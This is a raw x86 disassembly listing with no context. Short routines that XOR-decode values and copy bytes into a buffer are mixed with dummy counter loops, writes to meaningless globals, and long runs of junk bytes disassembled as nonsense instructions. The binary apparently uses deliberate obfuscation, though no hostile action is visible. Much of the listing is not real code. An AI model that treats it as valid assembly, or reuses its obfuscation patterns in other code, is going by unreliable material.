  4109b7:	sub    BYTE PTR [ebx-0x45],bl
  4109ba:	mov    DWORD PTR [eax],esi
  4109bc:	or     al,BYTE PTR [edx+0x71947a60]
  4109c2:	ins    BYTE PTR es:[edi],dx
  4109c3:	or     dh,ch
  4109c5:	mov    eax,0xfa44fa01
  4109ca:	fistp  QWORD PTR [ecx+0x4077e0c0]
  4109d0:	push   edi
  4109d1:	jp     0x410a47
  4109d3:	fimul  WORD PTR [eax-0x4d15ab08]
  4109d9:	dec    edx
  4109da:	mov    WORD PTR [edi+0x3c],ds
  4109dd:	xor    edi,DWORD PTR [esi-0xe]
  4109e0:	fisub  WORD PTR [eax-0x3ba66dc1]
  4109e6:	sti    
  4109e7:	jae    0x410a1d
  4109e9:	out    dx,eax
  4109ea:	push   edx
  4109ec:	loop   0x4109ed
  4109ee:	jle    0x410a61
  4109f0:	pusha  
  4109f1:	mov    ebx,0xfa5e38ab
  4109f6:	mov    esi,0x2c400f2e
  4109fb:	fild   QWORD PTR [esi+0x610dff88]
  410a01:	retf   
  410a02:	cmp    ebx,esi
  410a04:	dec    edi
  410a05:	push   ss
  410a06:	inc    eax
  410a07:	or     BYTE PTR [ecx-0x692a126c],ch
  410a0d:	in     eax,dx
  410a0e:	stos   DWORD PTR es:[edi],eax
  410a0f:	adc    al,0x6
  410a11:	int    0xf3
  410a13:	cmp    al,0xaa
  410a15:	sbb    al,BYTE PTR [esp+ecx*4]
  410a18:	pusha  
  410a19:	dec    edi
  410a1a:	sub    eax,0xe127fa1d
  410a1f:	push   esp
  410a20:	mov    WORD PTR [esi+0x54],gs
  410a23:	cmp    al,0x6c
  410a25:	scas   al,BYTE PTR es:[edi]
  410a26:	sbb    BYTE PTR [edi+0x36],ch
  410a29:	call   0x4dd3:0x3c1c7812
  410a30:	push   cs
  410a31:	iret   
  410a32:	dec    ecx
  410a33:	pushf  
  410a34:	adc    cl,BYTE PTR [ecx-0xa142411]
  410a3a:	push   es
  410a3b:	aas    
  410a3c:	or     eax,0x66b56faa
  410a41:	aam    0x16
  410a43:	imul   ecx,ebx,0x28ef7195
  410a49:	mov    ah,0x87
  410a4b:	dec    edi
  410a4c:	rcl    DWORD PTR [eax-0x5622e27a],0x5e
  410a53:	dec    edx
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	or     BYTE PTR [edi+eiz*1],dh
  410b23:	mov    eax,0x7e7e460d
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b0c
  410b2d:	lods   eax,DWORD PTR ds:[esi]
  410b2e:	add    ecx,DWORD PTR [edi+eax*2-0x5528c548]
  410b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b36:	jmp    0x9c9534a7
  410b3b:	iret   
  410b3c:	pop    ds
  410b3d:	adc    al,0x5b
  410b3f:	fild   DWORD PTR [esi-0x1c]
  410b42:	sbb    esp,DWORD PTR [edx-0x63]
  410b45:	sbb    ch,BYTE PTR [esi-0x31]
  410b48:	call   0x3a7be7e5
  410b4d:	jl     0x410bb1
  410b4f:	push   edi
  410b50:	adc    al,BYTE PTR ds:0xb1ed7aca
  410b56:	ficom  DWORD PTR [eax-0x2834cbc8]
  410b5c:	inc    ecx
  410b5d:	daa    
  410b5e:	pop    ebp
  410b5f:	ja     0x410b67
  410b61:	push   esp
  410b62:	sbb    eax,0xf41c5032
  410b67:	(bad)
  410b6b:	jb     0x410b30
  410b6d:	cmp    al,0xff
  410b6f:	in     eax,0x3b
  410b71:	in     eax,dx
  410b72:	push   0xffffffdc
  410b74:	mov    bh,cl
  410b76:	iret   
  410b77:	addr16 pop esi
  410b79:	(bad)  
  410b7a:	fadd   st(0),st
  410b7c:	(bad)  
  410b7e:	in     al,dx
  410b7f:	clc    
  410b80:	push   ecx
  410b81:	xlat   BYTE PTR ds:[ebx]
  410b82:	mov    ebx,0x74941f62
  410b87:	mov    eax,ds:0xd07647da
  410b8c:	icebp  
  410b8d:	aaa    
  410b8e:	pushf  
  410b8f:	jnp    0x410b60
  410b91:	loopne 0x410b62
  410b93:	add    ch,BYTE PTR [ecx+0x5343c267]
  410b99:	test   al,0xab
  410b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b9c:	test   al,0x4e
  410b9e:	(bad)  
  410b9f:	mov    eax,ds:0xcc5c1037
  410ba4:	xor    DWORD PTR [edx-0x5b],0x8faae70a
  410bab:	loop   0x410b8e
  410bad:	sub    al,0xd7
  410baf:	(bad)  
  410bb1:	mov    esi,0xd237da95
  410bb6:	pop    edi
  410bb7:	mov    bl,0x43
  410bb9:	clc    
  410bba:	hlt    
  410bbb:	cli    
  410bbc:	aas    
  410bbd:	out    dx,al
  410bbe:	test   DWORD PTR [esi+0x22],ecx
  410bc1:	sub    BYTE PTR [ebx-0x27],dh
  410bc4:	fisttp DWORD PTR [esi-0x71b23832]
  410bca:	sub    ebp,ebp
  410bcc:	js     0x410c11
  410bce:	in     eax,0x48
  410bd0:	js     0x410b80
  410bd2:	and    al,0xff
  410bd4:	mov    ?,WORD PTR [edx]
  410bd6:	adc    eax,0x87f1fa91
  410bdb:	inc    esp
  410bdc:	popa   
  410bdd:	inc    eax
  410bde:	push   0x9727f2ba
  410be3:	push   esi
  410be4:	push   edi
  410be5:	lds    esi,FWORD PTR [edi-0x72]
  410be8:	push   0xfffffff4
  410bea:	in     eax,dx
  410beb:	jno    0x410c08
  410bed:	push   ds
  410bee:	sub    edx,esp
  410bf0:	lahf   
  410bf1:	push   es
  410bf2:	pop    ds
  410bf3:	inc    ebp
  410bf4:	test   al,0x6a
  410bf6:	mov    ah,0x70
  410bf8:	pop    eax
  410bf9:	and    BYTE PTR [ebp*1-0x760c8e83],ch
  410c00:	popa   
  410c01:	jp     0x410c44
  410c03:	add    eax,0x96df9cc
  410c08:	bound  ecx,QWORD PTR [edx-0x386cbf85]
  410c0e:	jbe    0x410c8c
  410c10:	xchg   edx,eax
  410c11:	sbb    al,0xb8
  410c13:	fidivr WORD PTR ds:0xad54823e
  410c19:	psubb  mm3,QWORD PTR [ecx+0x52]
  410c1d:	push   edx
  410c1e:	inc    ecx
  410c1f:	data16 jecxz 0x410c63
  410c22:	push   esp
  410c23:	outs   dx,DWORD PTR ds:[esi]
  410c24:	pop    es
  410c25:	push   esp
  410c26:	(bad)  
  410c27:	js     0x410baf
  410c29:	lahf   
  410c2a:	xchg   ebx,eax
  410c2b:	ins    BYTE PTR es:[edi],dx
  410c2c:	adc    ebx,edi
  410c2e:	sbb    ah,cl
  410c30:	shl    DWORD PTR [ecx-0x32],1
  410c33:	loope  0x410c31
  410c35:	outs   dx,DWORD PTR ds:[esi]
  410c36:	and    ebp,DWORD PTR [ecx-0x10]
  410c39:	fdivp  st(1),st
  410c3b:	inc    ecx
  410c3c:	or     DWORD PTR [ecx],ebx
  410c3e:	dec    ecx
  410c3f:	cmp    ch,BYTE PTR [ecx+0x62b3651]
  410c45:	shl    DWORD PTR [esi],1
  410c47:	cmp    al,dh
  410c49:	sbb    eax,0x59e5cda0
  410c4e:	jo     0x410c81
  410c50:	es add dh,dh
  410c53:	dec    edx
  410c54:	xchg   esp,eax
  410c55:	das    
  410c56:	bound  edi,QWORD PTR ds:0xebb86eb5
  410c5c:	dec    edi
  410c5d:	push   cs
  410c5e:	jp     0x410bf5
  410c60:	ss pop ss
  410c62:	inc    ebx
  410c63:	imul   edx,DWORD PTR [edx+0x48],0xedb7f345
  410c6a:	bound  esi,QWORD PTR [ebx+ebp*4]
  410c6d:	sub    BYTE PTR [esp+edi*2-0x51fe3513],ch
  410c74:	cmp    al,0x57
  410c76:	dec    ecx
  410c77:	arpl   WORD PTR [esi+edi*8-0x21],bp
  410c7b:	pop    esp
  410c7c:	mov    ds:0x18981cbf,eax
  410c81:	loop   0x410c71
  410c83:	push   edx
  410c84:	jb     0x410c1a
  410c86:	mov    bl,0x4
  410c88:	add    ch,BYTE PTR [edx-0x40]
  410c8b:	push   ecx
  410c8c:	mov    eax,0x7813231a
  410c91:	sbb    cl,BYTE PTR [ebx+0x68]
  410c94:	sub    ah,BYTE PTR ss:[eax]
  410c97:	push   cs
  410c98:	pusha  
  410c99:	push   0x143ac105
  410c9e:	in     eax,dx
  410c9f:	push   edx
  410ca0:	mov    BYTE PTR [edi+ebp*8],ch
  410ca3:	(bad)  
  410ca4:	rcr    DWORD PTR [ebx-0x69],cl
  410ca7:	adc    al,0x6b
  410ca9:	mov    al,0x2e
  410cab:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410cb2:	or     eax,eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    cl,BYTE PTR [eax-0x73384fcc]
  410dd1:	inc    edi
  410dd2:	jle    0x410e52
  410dd4:	icebp  
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410de2
  410dd9:	int3   
  410dda:	push   edx
  410ddb:	lea    ebx,[ebx+ebx*1]
  410dde:	mov    esi,0x4c52287f
  410de3:	or     BYTE PTR [eax-0x1a],bh
  410de6:	repnz data16 std 
  410de9:	mov    ch,0x0
  410deb:	mov    dh,0x29
  410ded:	leave  
  410dee:	hlt    
  410def:	xor    BYTE PTR [eax-0x21d97e21],0xb0
  410df6:	jmp    0xfb63:0x2d72a73c
  410dfd:	in     al,0x7b
  410dff:	lahf   
  410e00:	inc    edx
  410e01:	push   cs
  410e02:	sub    al,0x95
  410e04:	mov    ds:0xcc9717,eax
  410e09:	idiv   BYTE PTR [ebx+0x40]
  410e0c:	sbb    DWORD PTR [esp+ebp*1],esp
  410e0f:	mov    bh,0x2b
  410e11:	stos   BYTE PTR es:[edi],al
  410e12:	pop    ds
  410e13:	xchg   esi,eax
  410e14:	inc    eax
  410e15:	add    al,0x89
  410e17:	adc    eax,DWORD PTR [ecx]
  410e19:	push   ss
  410e1a:	ss sub eax,0xe0478975
  410e20:	mov    al,0xbb
  410e22:	xchg   edi,eax
  410e23:	sub    edx,esi
  410e25:	and    dh,BYTE PTR [edx]
  410e27:	mov    dh,0x41
  410e29:	je     0x410dc7
  410e2b:	mov    esp,0xeefc37f0
  410e30:	inc    edx
  410e31:	adc    al,0x3c
  410e33:	ret    0xc151
  410e36:	loopne 0x410ea9
  410e38:	(bad)  
  410e39:	loop   0x410e26
  410e3b:	mul    ebx
  410e3d:	cmp    ch,bl
  410e3f:	or     al,0xd3
  410e41:	sub    eax,0xbce359ce
  410e46:	pop    es
  410e47:	adc    BYTE PTR [ebx-0x30b751ee],ch
  410e4d:	adc    dh,BYTE PTR [ecx]
  410e4f:	sbb    DWORD PTR [edi-0x765150d2],esp
  410e55:	fs pop ds
  410e57:	or     BYTE PTR [esi+0x3f],bh
  410e5a:	out    dx,al
  410e5b:	stos   BYTE PTR es:[edi],al
  410e5c:	xchg   edi,eax
  410e5d:	lods   eax,DWORD PTR ds:[esi]
  410e5e:	jb     0x410e41
  410e60:	add    al,0x2d
  410e62:	xlat   BYTE PTR ds:[ebx]
  410e63:	addr16 in eax,0x6e
  410e66:	call   0xddba2921
  410e6b:	adc    cl,BYTE PTR [bp+si-0x62fe]
  410e70:	adc    eax,0x507f4da3
  410e75:	add    ecx,DWORD PTR [ecx]
  410e77:	cli    
  410e78:	xchg   edi,eax
  410e79:	mov    dh,0x0
  410e7b:	shl    DWORD PTR [eax],1
  410e7d:	fidivr WORD PTR [esi+edi*2+0x5a]
  410e81:	out    0x9,al
  410e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e84:	and    eax,0xe5f27758
  410e89:	(bad)  
  410e8a:	lock shr ebx,1
  410e8d:	push   ss
  410e8e:	dec    BYTE PTR [esi-0x23]
  410e91:	push   es
  410e92:	fiadd  WORD PTR [edx+eax*4]
  410e95:	ror    BYTE PTR [edx],cl
  410e97:	out    dx,eax
  410e98:	or     al,0xfe
  410e9a:	mov    edi,0x6b5dcc64
  410e9f:	sbb    BYTE PTR [edi+esi*1-0x5f],ah
  410ea3:	jns    0x410e86
  410ea5:	popf   
  410ea6:	std    
  410ea7:	or     DWORD PTR [ecx-0x156ad1f8],ecx
  410ead:	push   eax
  410eae:	shr    ah,0xb9
  410eb1:	mov    ah,0xe7
  410eb3:	dec    esi
  410eb4:	stc    
  410eb5:	inc    edi
  410eb6:	je     0x410f20
  410eb8:	mov    al,ds:0x3aa2f2d5
  410ebd:	cmp    dl,BYTE PTR [ebp+eiz*8-0x1744dae2]
  410ec4:	or     cl,cl
  410ec6:	jbe    0x410ebe
  410ec8:	test   DWORD PTR [edx+0x22],ebx
  410ecb:	and    eax,0x468da28
  410ed0:	jno    0x410f3c
  410ed2:	push   eax
  410ed3:	test   BYTE PTR [esi],al
  410ed5:	cdq    
  410ed6:	adc    bl,BYTE PTR [edx+0xdb9e6d]
  410edc:	add    eax,0x45646b72
  410ee1:	xor    al,0x15
  410ee3:	into   
  410ee4:	ins    BYTE PTR es:[edi],dx
  410ee5:	jne    0x410ebc
  410ee7:	dec    ebx
  410ee8:	pop    edx
  410ee9:	adc    al,0xc5
  410eeb:	sbb    ch,al
  410eed:	popa   
  410eee:	cmp    BYTE PTR [ecx+0x2c],ah
  410ef1:	inc    ebx
  410ef2:	mov    dh,0x6
  410ef4:	ds out dx,al
  410ef6:	xor    BYTE PTR [ebx-0x42],al
  410ef9:	push   edi
  410efa:	jae    0x410ecb
  410efc:	ss iret 
  410efe:	aas    
  410eff:	fisubr WORD PTR ds:0x92541f76
  410f05:	push   es
  410f06:	in     eax,dx
  410f07:	fidivr DWORD PTR [ebx+0x7d]
  410f0a:	mov    DWORD PTR [ecx-0x6c52992e],esp
  410f10:	in     eax,0xfc
  410f12:	(bad)
  410f15:	or     ebp,DWORD PTR [ebp-0x38]
  410f18:	xor    cl,BYTE PTR [esi]
  410f1a:	jge    0x410f0c
  410f1c:	inc    edi
  410f1d:	(bad)  
  410f1e:	adc    ax,0xc5e6
  410f22:	sub    eax,0x6cd02ef9
  410f27:	xor    eax,0xb8bd1cc5
  410f2c:	fs dec edx
  410f2e:	sub    al,ch
  410f30:	outs   dx,BYTE PTR ds:[esi]
  410f31:	test   BYTE PTR [bp+di],dh
  410f34:	pop    ss
  410f35:	inc    ecx
  410f36:	dec    esp
  410f37:	jge    0x410ecb
  410f39:	outs   dx,BYTE PTR ds:[esi]
  410f3a:	mov    WORD PTR [ecx-0x7777c29],cs
  410f40:	push   cs
  410f41:	xchg   edx,eax
  410f42:	or     DWORD PTR [esi],ebx
  410f44:	xor    DWORD PTR [esi+0x3b25ca1e],0x197e6bbc
  410f4e:	stc    
  410f4f:	in     eax,dx
  410f50:	sbb    al,bh
  410f52:	jmp    0xe8fefc3a
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	sbb    DWORD PTR [esi+0x450fc1e5],0x7e
  410fff:	jle    0x410ff2
  411001:	jg     0x411081
  411003:	jle    0x411025
  411005:	pop    ds
  411006:	xchg   ecx,eax
  411007:	loopne 0x410fcd
  411009:	mov    edi,0x2c3ede69
  41100e:	mov    eax,0x54be0fa6
  411013:	dec    edi
  411014:	lods   eax,DWORD PTR ds:[esi]
  411015:	ins    BYTE PTR es:[edi],dx
  411016:	out    0x9f,al
  411018:	mov    bh,0x9b
  41101a:	dec    esi
  41101b:	loop   0x411093
  41101d:	or     eax,eax
  41101f:	mov    esp,0x23530535
  411024:	dec    esi
  411025:	and    edi,0xfffffffc
  411028:	lds    esi,FWORD PTR ds:0x6d1a2706
  41102f:	sbb    al,0x81
  411031:	std    
  411032:	mov    ds:0x7ebce85f,al
  411037:	daa    
  411038:	or     eax,0xa88b7c70
  41103d:	mov    esp,0x57c3035e
  411042:	push   cs
  411043:	lods   eax,DWORD PTR ds:[esi]
  411044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411045:	and    ecx,ebp
  411047:	adc    al,0x39
  411049:	(bad)  
  41104a:	sub    eax,0xa73b275e
  41104f:	xchg   ebp,eax
  411050:	clc    
  411051:	add    eax,0x2791e8c3
  411056:	push   ebp
  411057:	push   eax
  411058:	adc    ebp,DWORD PTR [eax-0x2c]
  41105b:	inc    esi
  41105c:	push   es
  41105d:	fnstenv [ecx+0x5a]
  411060:	sub    DWORD PTR fs:[edi+0x180f7dae],esi
  411067:	pop    es
  411068:	stos   BYTE PTR es:[edi],al
  411069:	test   dh,0x1c
  41106c:	or     ah,BYTE PTR ds:0x8cc9c369
  411072:	dec    esp
  411073:	mov    dl,cl
  411075:	out    0xb9,al
  411077:	or     DWORD PTR [edi+esi*8],eax
  41107a:	adc    dl,bh
  41107c:	hlt    
  41107d:	call   0x3b1a83f6
  411082:	js     0x411037
  411084:	inc    edx
  411085:	cli    
  411086:	sub    esp,DWORD PTR [eax+edi*8]
  411089:	ins    BYTE PTR es:[edi],dx
  41108a:	and    cl,BYTE PTR [ebx-0x4b]
  41108d:	cmc    
  41108e:	pop    fs
  411090:	clc    
  411091:	or     ebp,eax
  411093:	cdq    
  411094:	pop    esi
  411095:	sbb    esp,esp
  411097:	retf   0x8e20
  41109a:	jge    0x4110a8
  41109c:	dec    esp
  41109d:	(bad)  
  41109f:	daa    
  4110a0:	cwde   
  4110a1:	ret    0x22c0
  4110a4:	inc    edx
  4110a5:	bound  esi,QWORD PTR [ecx]
  4110a7:	imul   edx,DWORD PTR [edx-0x1b],0xffffffc2
  4110ab:	aad    0xb2
  4110ad:	mov    ds:0x356305df,al
  4110b2:	cmpxchg DWORD PTR [edi-0x32],ecx
  4110b6:	jno    0x41109b
  4110b8:	push   es
  4110b9:	sbb    bh,BYTE PTR [edx-0xe4da51f]
  4110bf:	pop    esp
  4110c0:	push   esp
  4110c1:	adc    eax,0x2496fdd4
  4110c6:	nop
  4110c7:	mov    ds:0x227c8293,al
  4110cc:	mov    ecx,0x5e6c6de3
  4110d1:	cmp    BYTE PTR [edx-0x6d],ch
  4110d4:	push   eax
  4110d5:	jnp    0x4110d1
  4110d7:	js     0x411109
  4110d9:	addr16 pop edi
  4110db:	(bad)  
  4110dc:	call   0x383e2a71
  4110e1:	inc    eax
  4110e2:	adc    ah,BYTE PTR [si]
  4110e5:	adc    al,0x38
  4110e7:	xor    al,0x9
  4110e9:	mov    edx,0xe63659ba
  4110ee:	fwait
  4110ef:	cmp    ebx,DWORD PTR [esi]
  4110f1:	mov    ebp,DWORD PTR [ebp+0x28a6242b]
  4110f7:	dec    eax
  4110f8:	inc    ebx
  4110f9:	popf   
  4110fa:	gs inc esp
  4110fc:	scas   eax,DWORD PTR es:[edi]
  4110fd:	mov    fs,WORD PTR [edi-0x67ee2d72]
  411103:	pusha  
  411104:	in     eax,0xf7
  411106:	ins    BYTE PTR es:[edi],dx
  411107:	mov    al,0x17
  411109:	add    BYTE PTR [edi+0x61],bl
  41110c:	jge    0x4110e3
  41110e:	xchg   ecx,eax
  41110f:	mov    ch,dl
  411111:	(bad)  
  411112:	out    dx,al
  411113:	cs enter 0x4b0e,0x9a
  411118:	(bad)  
  411119:	cli    
  41111a:	jg     0x4110af
  41111c:	or     DWORD PTR [ebx],edx
  41111e:	cmp    ah,BYTE PTR [edi]
  411120:	fsub   DWORD PTR [eax-0x17db9b6b]
  411126:	jmp    0xcabf:0xed38c8dc
  41112d:	(bad)  
  41112e:	sbb    esi,eax
  411130:	enter  0x3acf,0x52
  411134:	arpl   WORD PTR [edi+0x7f70d3eb],ax
  41113a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41113b:	pop    esp
  41113c:	test   al,0x17
  41113e:	ja     0x4110f7
  411140:	xchg   edx,eax
  411141:	jns    0x4110dd
  411143:	je     0x4110df
  411145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411146:	mov    eax,ds:0x65319448
  41114b:	stc    
  41114c:	and    ah,BYTE PTR [edx]
  41114e:	and    dl,BYTE PTR [ecx+ebp*8-0x4f3e4e2]
  411155:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411157:	jne    0x411172
  411159:	xchg   ecx,eax
  41115a:	jae    0x4111b1
  41115c:	jbe    0x41119c
  41115e:	adc    BYTE PTR [eax-0x7d],dh
  411161:	xchg   DWORD PTR [edx-0x19],esp
  411164:	dec    ecx
  411165:	inc    edx
  411166:	dec    esp
  411167:	lods   eax,DWORD PTR ds:[esi]
  411168:	js     0x41111d
  41116a:	sbb    DWORD PTR [ebp+0x24],ecx
  41116d:	std    
  41116e:	(bad)  
  41116f:	pop    esi
  411170:	mov    dh,0x43
  411172:	ins    BYTE PTR es:[edi],dx
  411173:	mov    esi,ebp
  411175:	stos   BYTE PTR es:[edi],al
  411176:	add    ebp,DWORD PTR [ebp-0x24678a28]
  41117c:	inc    ecx
  41117d:	lahf   
  41117e:	(bad)  
  41117f:	jp     0x41119a
  411181:	(bad)  
  411182:	jmp    0x6600:0x3b02bf
  411189:	add    eax,edi
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x86dabba7
  4111f1:	shl    DWORD PTR [esi],cl
  4111f3:	jmp    0x411183
  4111f5:	inc    edx
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x4111d3
  4111fd:	pop    es
  4111fe:	iret   
  4111ff:	push   cs
  411200:	out    0xf8,eax
  411202:	and    al,0xce
  411204:	repnz lahf 
  411206:	fcom   QWORD PTR [ebx]
  411208:	or     edi,DWORD PTR [edi-0xcf49358]
  41120e:	and    al,BYTE PTR [ebp+0x69b03ab5]
  411214:	xchg   ebx,eax
  411215:	xchg   esp,eax
  411216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411217:	xchg   ebx,eax
  411218:	not    DWORD PTR [ebx+0x47]
  41121b:	dec    esp
  41121c:	div    ch
  41121e:	out    dx,eax
  41121f:	xor    al,0xa0
  411221:	adc    esi,DWORD PTR [edi-0x7fe6d025]
  411227:	sbb    ebx,esp
  411229:	push   cs
  41122a:	mov    dh,al
  41122c:	out    dx,eax
  41122d:	je     0x41124d
  41122f:	cmp    eax,0x69e6e1bb
